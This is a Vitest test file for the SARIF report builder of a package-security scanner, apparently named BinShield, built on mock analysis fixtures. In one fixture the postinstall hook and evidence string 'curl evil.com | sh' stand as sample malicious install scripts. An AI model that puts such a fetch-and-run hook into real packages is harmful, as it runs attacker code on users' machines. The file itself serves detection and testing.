import { describe, expect, it } from "vitest";
import { buildSarif } from "./sarif";
// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function makeOutcome(overrides = {}) {
    return {
        target: {
            name: "test-pkg",
            version: "1.0.0",
            path: "node_modules/test-pkg",
            source: "lockfile",
            nativeCandidate: true
        },
        ...overrides
    };
}
// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
describe("buildSarif", () => {
    it("returns a valid SARIF 2.1.0 document shape", () => {
        const doc = buildSarif([]);
        expect(doc.version).toBe("2.1.0");
        expect(doc.$schema).toContain("sarif-schema-2.1.0");
        expect(doc.runs).toHaveLength(1);
        expect(doc.runs[0].tool.driver.name).toBe("BinShield");
        expect(Array.isArray(doc.runs[0].results)).toBe(true);
    });
    it("produces no results for outcomes with errors (no analysis)", () => {
        const outcome = makeOutcome({ error: "timeout" });
        const doc = buildSarif([outcome]);
        expect(doc.runs[0].results).toHaveLength(0);
    });
    it("maps critical severity to error level", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_1",
                ecosystem: "npm",
                packageName: "evil-pkg",
                version: "9.9.9",
                status: "complete",
                riskScore: 95,
                riskLevel: "critical",
                summary: "Very bad",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 1000,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_1",
                        filename: "evil.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 1000,
                        functionCount: 5,
                        importCount: 2,
                        riskScore: 95,
                        riskLevel: "critical",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: true, details: ["Beaconing detected"] },
                            filesystem: { detected: false, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [
                            {
                                severity: "critical",
                                title: "Outbound beaconing",
                                description: "Binary opens TCP socket to hardcoded C2.",
                                recommendation: "Block immediately."
                            }
                        ]
                    }
                ]
            }
        });
        const doc = buildSarif([outcome]);
        const result = doc.runs[0].results[0];
        expect(result.level).toBe("error");
        expect(result.ruleId).toContain("outbound-beaconing");
    });
    it("maps high severity to error level", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_2",
                ecosystem: "npm",
                packageName: "risky-pkg",
                version: "2.0.0",
                status: "complete",
                riskScore: 70,
                riskLevel: "high",
                summary: "Risky",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 500,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_2",
                        filename: "risky.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 500,
                        functionCount: 3,
                        importCount: 1,
                        riskScore: 70,
                        riskLevel: "high",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: false, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: true, details: ["XOR encoded strings"] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [
                            {
                                severity: "high",
                                title: "String obfuscation",
                                description: "XOR-encoded strings evade static scanners.",
                                recommendation: "Investigate binary origin."
                            }
                        ]
                    }
                ]
            }
        });
        const doc = buildSarif([outcome]);
        expect(doc.runs[0].results[0].level).toBe("error");
    });
    it("maps medium severity to warning level", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_3",
                ecosystem: "npm",
                packageName: "medium-pkg",
                version: "1.5.0",
                status: "complete",
                riskScore: 45,
                riskLevel: "medium",
                summary: "Moderate",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 300,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_3",
                        filename: "medium.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 300,
                        functionCount: 2,
                        importCount: 1,
                        riskScore: 45,
                        riskLevel: "medium",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: true, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [
                            {
                                severity: "medium",
                                title: "Extension loading path",
                                description: "Exposes an extension loading path.",
                                recommendation: "Disable unless required."
                            }
                        ]
                    }
                ]
            }
        });
        const doc = buildSarif([outcome]);
        expect(doc.runs[0].results[0].level).toBe("warning");
    });
    it("maps low and info severity to note level", () => {
        const makeAnalysisWithSeverity = (severity) => makeOutcome({
            analysis: {
                id: `pkg_sev_${severity}`,
                ecosystem: "npm",
                packageName: "low-pkg",
                version: "1.0.0",
                status: "complete",
                riskScore: 10,
                riskLevel: "low",
                summary: "Low risk",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 100,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: `bin_sev_${severity}`,
                        filename: "low.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 100,
                        functionCount: 1,
                        importCount: 1,
                        riskScore: 10,
                        riskLevel: "low",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: false, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [{ severity, title: "Entropy access", description: "Reads urandom.", recommendation: "No action." }]
                    }
                ]
            }
        });
        expect(buildSarif([makeAnalysisWithSeverity("low")]).runs[0].results[0].level).toBe("note");
        expect(buildSarif([makeAnalysisWithSeverity("info")]).runs[0].results[0].level).toBe("note");
    });
    it("includes binary findings in results", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_bcrypt",
                ecosystem: "npm",
                packageName: "bcrypt",
                version: "5.1.1",
                status: "complete",
                riskScore: 12,
                riskLevel: "low",
                summary: "Normal bcrypt",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 100,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_bcrypt",
                        filename: "bcrypt_lib.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 100,
                        functionCount: 10,
                        importCount: 3,
                        riskScore: 12,
                        riskLevel: "low",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: true, details: ["Reads /dev/urandom"] },
                            process: { detected: false, details: [] },
                            crypto: { detected: true, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [
                            {
                                severity: "info",
                                title: "Entropy source access",
                                description: "Reads system entropy for password hashing.",
                                recommendation: "No action needed."
                            }
                        ]
                    }
                ]
            }
        });
        const doc = buildSarif([outcome]);
        expect(doc.runs[0].results).toHaveLength(1);
        const result = doc.runs[0].results[0];
        expect(result.ruleId).toContain("binary");
        expect(result.message.text).toContain("entropy");
        // Location should reference the binary filename
        expect(result.locations[0].physicalLocation.artifactLocation.uri).toContain("bcrypt_lib.node");
    });
    it("includes install-script (ScriptFinding) results", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_evil_script",
                ecosystem: "npm",
                packageName: "malicious-pkg",
                version: "0.0.1",
                status: "complete",
                riskScore: 99,
                riskLevel: "critical",
                summary: "Install-time RCE",
                sourceMatchConfidence: "low",
                binaryCount: 0,
                totalBinarySize: 0,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [],
                manifestAnalysis: {
                    id: "manifest_1",
                    ecosystem: "npm",
                    lifecycleHooks: { postinstall: "curl evil.com | sh" },
                    hasInstallScripts: true,
                    analyzedFiles: ["package.json"],
                    riskScore: 99,
                    riskLevel: "critical",
                    threats: {
                        installHook: { detected: true, details: [] },
                        scriptInjection: { detected: false, details: [] },
                        environmentTheft: { detected: false, details: [] },
                        dependencyConfusion: { detected: false, details: [] },
                        wiper: { detected: false, details: [] },
                        reverseShell: { detected: true, details: [] },
                        remoteCodeExecution: { detected: true, details: [] }
                    },
                    findings: [
                        {
                            category: "reverseShell",
                            severity: "critical",
                            title: "Reverse shell in postinstall",
                            description: "Postinstall hook downloads and executes a remote shell script.",
                            filePath: "package.json#scripts.postinstall",
                            evidence: "curl evil.com | sh",
                            lifecycleHook: "postinstall",
                            recommendation: "Remove or quarantine this package immediately."
                        }
                    ],
                    knownMalwareAdvisoryIds: [],
                    sourceMatchConfidence: "low",
                    analyzedAt: "2026-01-01T00:00:00.000Z"
                }
            }
        });
        const doc = buildSarif([outcome]);
        const results = doc.runs[0].results;
        // Should have one result from the script finding
        expect(results).toHaveLength(1);
        const result = results[0];
        expect(result.ruleId).toContain("script");
        expect(result.level).toBe("error");
        // description starts with "Postinstall" (capital) — check case-insensitively
        expect(result.message.text.toLowerCase()).toContain("postinstall");
        expect(result.locations[0].physicalLocation.artifactLocation.uri).toContain("package.json");
    });
    it("emits both binary and script findings when both are present", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_mixed",
                ecosystem: "npm",
                packageName: "mixed-pkg",
                version: "1.0.0",
                status: "complete",
                riskScore: 80,
                riskLevel: "critical",
                summary: "Both paths flagged",
                sourceMatchConfidence: "low",
                binaryCount: 1,
                totalBinarySize: 500,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_mixed",
                        filename: "mixed.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 500,
                        functionCount: 5,
                        importCount: 2,
                        riskScore: 80,
                        riskLevel: "critical",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: true, details: [] },
                            filesystem: { detected: false, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [
                            {
                                severity: "high",
                                title: "Outbound network call",
                                description: "Binary makes outbound connections.",
                                recommendation: "Block until reviewed."
                            }
                        ]
                    }
                ],
                manifestAnalysis: {
                    id: "manifest_mixed",
                    ecosystem: "npm",
                    lifecycleHooks: {},
                    hasInstallScripts: true,
                    analyzedFiles: ["install.js"],
                    riskScore: 90,
                    riskLevel: "critical",
                    threats: {
                        installHook: { detected: true, details: [] },
                        scriptInjection: { detected: false, details: [] },
                        environmentTheft: { detected: true, details: [] },
                        dependencyConfusion: { detected: false, details: [] },
                        wiper: { detected: false, details: [] },
                        reverseShell: { detected: false, details: [] },
                        remoteCodeExecution: { detected: false, details: [] }
                    },
                    findings: [
                        {
                            category: "environmentTheft",
                            severity: "critical",
                            title: "Environment variable exfiltration",
                            description: "Script reads and exfiltrates environment variables.",
                            filePath: "install.js",
                            evidence: "process.env",
                            recommendation: "Remove immediately."
                        }
                    ],
                    knownMalwareAdvisoryIds: [],
                    sourceMatchConfidence: "low",
                    analyzedAt: "2026-01-01T00:00:00.000Z"
                }
            }
        });
        const doc = buildSarif([outcome]);
        expect(doc.runs[0].results).toHaveLength(2);
        const ruleIds = doc.runs[0].results.map((r) => r.ruleId);
        expect(ruleIds.some((id) => id.includes("binary"))).toBe(true);
        expect(ruleIds.some((id) => id.includes("script"))).toBe(true);
    });
    it("deduplicates rules when the same finding title appears in multiple packages", () => {
        const makeOutcomeWithFinding = (pkgName, version) => ({
            target: { name: pkgName, version, path: `node_modules/${pkgName}`, source: "lockfile", nativeCandidate: true },
            analysis: {
                id: `pkg_${pkgName}`,
                ecosystem: "npm",
                packageName: pkgName,
                version,
                status: "complete",
                riskScore: 10,
                riskLevel: "low",
                summary: "",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 100,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: `bin_${pkgName}`,
                        filename: `${pkgName}.node`,
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 100,
                        functionCount: 1,
                        importCount: 1,
                        riskScore: 10,
                        riskLevel: "low",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: true, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [{ severity: "info", title: "Entropy source access", description: "Reads urandom.", recommendation: "No action." }]
                    }
                ]
            }
        });
        const doc = buildSarif([makeOutcomeWithFinding("pkgA", "1.0.0"), makeOutcomeWithFinding("pkgB", "2.0.0")]);
        // Two results, but only one rule
        expect(doc.runs[0].results).toHaveLength(2);
        expect(doc.runs[0].tool.driver.rules).toHaveLength(1);
    });
    it("includes ruleId, level, message.text, and a non-empty locations array on every result", () => {
        const outcome = makeOutcome({
            analysis: {
                id: "pkg_basic",
                ecosystem: "npm",
                packageName: "basic",
                version: "1.0.0",
                status: "complete",
                riskScore: 20,
                riskLevel: "low",
                summary: "",
                sourceMatchConfidence: "high",
                binaryCount: 1,
                totalBinarySize: 100,
                aiModel: "grok",
                createdAt: "2026-01-01T00:00:00.000Z",
                binaries: [
                    {
                        id: "bin_basic",
                        filename: "basic.node",
                        architecture: "x86_64",
                        format: "ELF",
                        fileSize: 100,
                        functionCount: 1,
                        importCount: 1,
                        riskScore: 20,
                        riskLevel: "low",
                        decompiledPreview: "",
                        aiExplanation: "",
                        imports: [],
                        strings: [],
                        behaviors: {
                            network: { detected: false, details: [] },
                            filesystem: { detected: false, details: [] },
                            process: { detected: false, details: [] },
                            crypto: { detected: false, details: [] },
                            obfuscation: { detected: false, details: [] },
                            dataExfiltration: { detected: false, details: [] }
                        },
                        findings: [{ severity: "medium", title: "Some finding", description: "Details here.", recommendation: "Do this." }]
                    }
                ]
            }
        });
        const doc = buildSarif([outcome]);
        for (const result of doc.runs[0].results) {
            expect(result.ruleId).toBeTruthy();
            expect(result.level).toBeTruthy();
            expect(result.message.text).toBeTruthy();
            expect(result.locations.length).toBeGreaterThan(0);
        }
    });
});
